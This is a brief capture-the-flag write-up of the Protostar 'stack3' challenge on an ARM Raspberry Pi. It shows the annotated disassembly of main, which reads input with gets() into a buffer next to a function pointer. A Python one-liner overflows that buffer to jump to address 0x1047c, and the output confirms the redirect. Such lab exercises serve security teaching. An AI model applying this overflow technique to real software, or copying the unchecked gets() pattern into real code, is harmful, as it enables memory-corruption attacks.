#stack3
@(protostar)
```armasm
.text:00010494 main                                    ; DATA XREF: _start+20o
.text:00010494                                         ; .text:off_10388o
.text:00010494
.text:00010494 var_54          = -0x54
.text:00010494 var_50          = -0x50
.text:00010494 s               = -0x48
.text:00010494 var_8           = -8
.text:00010494
.text:00010494                 STMFD   SP!, {R11,LR}
.text:00010498                 ADD     R11, SP, #4
.text:0001049C                 SUB     SP, SP, #0x50
.text:000104A0                 STR     R0, [R11,#var_50]
.text:000104A4                 STR     R1, [R11,#var_54]
.text:000104A8                 MOV     R3, #0
.text:000104AC                 STR     R3, [R11,#var_8]
.text:000104B0                 SUB     R3, R11, #-s
.text:000104B4                 MOV     R0, R3          ; s
.text:000104B8                 BL      gets
.text:000104BC                 LDR     R3, [R11,#var_8]
.text:000104C0                 CMP     R3, #0
.text:000104C4                 BEQ     loc_104DC
.text:000104C8                 LDR     R0, =aCallingFunctio ; "calling function pointer, jumping to 0x"...
.text:000104CC                 LDR     R1, [R11,#var_8]
.text:000104D0                 BL      printf
.text:000104D4                 LDR     R3, [R11,#var_8]
.text:000104D8                 BLX     R3
.text:000104DC
.text:000104DC loc_104DC                               ; CODE XREF: main+30j
.text:000104DC                 MOV     R0, R3
.text:000104E0                 SUB     SP, R11, #4
.text:000104E4                 LDMFD   SP!, {R11,PC}
```
```bash
pi@raspberrypi:~/protostar/stack/stack3 $ python -c "print 'A'*64+'\x7c\x04\x01'" | ./stack3 
calling function pointer, jumping to 0x0001047c
code flow successfully change
```
